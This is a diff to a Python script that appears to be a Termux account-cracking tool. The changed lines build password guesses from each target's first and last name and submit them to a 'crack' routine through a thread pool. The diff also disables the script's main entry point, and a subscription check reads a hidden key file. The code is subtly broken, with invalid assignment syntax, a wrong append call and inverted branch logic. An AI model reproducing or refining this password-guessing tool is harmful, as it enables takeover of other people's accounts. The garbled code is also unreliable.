@@ -277,12 +277,12 @@ def name2():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0],last=nmf.split(' ')[1]
-			pwv = ['445566']
+			pwv = [frs,last]
 			if len(nmf):
 				if len(frs +last):
 					pass
 				else:
-					pwv.append(frs+last)
+					pwv.append(frs,last)
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -1320,14 +1320,14 @@ class Main:
  
 		self.loop +=1
  
-if len(sys.argv) == 2:
-	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
-		helpnote()
-	else:
-		Main()
+#if len(sys.argv) == 2:
+#	if sys.argv[1] == "--help" or sys.argv[1] == "-h":
+	#	helpnote()
+#	else:
+#		Main()
  
-try:Main()
-except Exception as e:exit(str(e))
+#try:Main()
+#except Exception as e:exit(str(e))
  
 def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
